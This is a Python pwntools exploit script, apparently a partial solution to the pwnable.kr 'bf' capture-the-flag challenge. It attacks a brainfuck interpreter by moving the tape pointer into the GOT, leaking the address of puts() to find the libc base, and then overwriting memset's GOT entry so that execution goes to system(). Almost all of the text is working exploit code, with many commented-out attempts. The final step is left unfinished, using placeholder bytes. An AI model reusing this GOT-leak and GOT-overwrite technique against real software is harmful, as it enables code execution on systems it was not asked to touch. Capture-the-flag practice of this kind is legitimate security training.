from pwn import *

context.update(arch="i386", os="linux")

# Logging
log.info("Start pwning...")

#ELF_NAME = "./ctf-bf"
#ELF_NAME = "./bf"
# Load executable
#exe = ELF("./bf")
#exe = ELF(ELF_NAME)

# Libc
libc = ELF("./libc.so.6")
#libc_base = 0xf7e1b000 # TODO - re-adjust base - I changed it cuz of gdb 
libc_base = 0xf7e1b000 # Bf local one
#libc_base = 0xf7d73000 # TODO - re-adjust base - I changed it cuz of gdb 
#libc_base = 0xf7d73000 # The original base
#libc_base = 0xf7df8000 # The original base
#libc_base = 0xf7e0a000 # TODO - re-adjust base - I changed it cuz of gdb 
libc.address = libc_base
puts_addr = p32(next(libc.search(b"puts")))
#execve_addr = p32(next(libc.search(b"libc_system")))

#print(f"DUMP: {my_rop.dump()}")
# Start process
conn = process("./bf")
#conn = process("./ctf-bf")
#conn = remote("pwnable.kr",9001)
print(conn.recvline()) # main massage
print(conn.recvline()) # main massage
#conn = process(ELF_NAME)

with open("payload", "w") as f:
    f.write("")
# 1st part - before the input - just the commands
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
print(f"system_addr: {str(system_addr)}")
print(f"execve: {p32(execve_addr)}")
padding = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaa"  
# fill stack with arbitrary values so I can increase esp and prepare stack for
sh_addr = system_addr + 0x120d7b

return_addr = libc_base + 0x00003980 # return from program - we call it since if we call
#exit() then our execve() fork process will die
arbitrary_bash_addr = 0xffffcc0c
new_esp_val = 0x12345678
#payload=padding+p32(0xdeadbeef)+p32(execve_addr)+p32(return_addr)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
jmp_back_to_code_start = 0x8048470
#payload=padding+p32(0xdeadbeef)+p32(0x0804857d)+p32(0x0804857d)+p32(sh_addr)+p32(0xffff2222)+p32(0xffff1234)+p32(sh_addr)+ p32(new_esp_val)
jmp_back_to_code_start = 0x8048470
print(f"sh_addr: {str(sh_addr)}")
good_jump_addr = 0x0804857d
#payload = padding + p32(0xdeadbeef) +  p32(good_jump_addr)
payload = b"<" * 136 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b".>.>.>." # leak the address of puts
payload += b"<<<" # leak the address of puts
payload += b">" * 24 #move back 136 bytes -,.\nAB\n".encode() # --> should work
payload += b",>,>,>," # getchar - for getting the last char
payload += b"." # trigger char
payload += b"AAAABBBB" # payload
payload += b"[" # call to puts()
payload += b"\n" # call to puts()
conn.send(payload)

the_output = conn.recvn(4)
print(f"OUTPUT: {the_output}")

# 2nd part - the input to write ( the function to jump to ) 
with open("payload", "wb+") as f:
    f.write(payload)
# separate sends cuz of annoying encoding / decoding issue with p32() and
#pasted
#print(f"LOL: {conn.recvline()}")
with open("output", "wb") as a:
    a.write(the_output)

puts_addr = unpack(the_output, endian='little')
print(f"puts addr: {puts_addr}") # receive until newline
print(f"puts addr: {hex(puts_addr)}") # receive until newline
puts_distance_from_libc = 392368
print(f"distance: {puts_distance_from_libc}")
libc_addr = puts_addr - puts_distance_from_libc
print(f"libc addr: {libc_addr}") # receive until newline
print(f"libc addr: {hex(libc_addr)}") # receive until newline
libc.address = libc_addr
system_addr = libc.symbols["system"]
execve_addr = libc.symbols["execve"]
putchar_addr = libc.symbols["putchar"]
print(f"system_addr: {str(hex(system_addr))}")
print(f"putchar: {str(hex(putchar_addr))}")
#pasted

target = libc_addr + 0x001134d9 # add to esp
my_rop = p32(target)
print(f"ROP: {my_rop}")
#payload = my_rop
# I'm going to bulid a ROP chain here in the heap!
heap_arbitrary_addr = 0x804b0a7
#payload +=b"BBBB"
heap_rop_nop = libc_addr + 0x0000c30c
print(f"heap nop rop : {hex(heap_rop_nop)}")
#payload =my_rop
fgets_addr_in_main = 0x8048734
memset_addr_in_main = 0x8048700
# 2nd program iteration - 1st half
payload = p32(memset_addr_in_main)
payload += b"<"  * 7# decrease from putchar() GOT to memset() GOT address
payload += b",>,>,>," # Setting the memset() GOT address
payload += b"[" # call to puts()
payload += b"\n" # call to puts()
 # we can replace the address of memset with the address of system!
conn.sendline(payload)
with open("payload", "ab+") as f:
    f.write(payload)

# 2nd program iteration - 2nd half
payload = b"AAAABBBB" # the new address of memset()
payload += b"\n" # call to puts()
conn.sendline(payload)

with open("payload", "ab+") as f:
    f.write(payload)

print(payload)
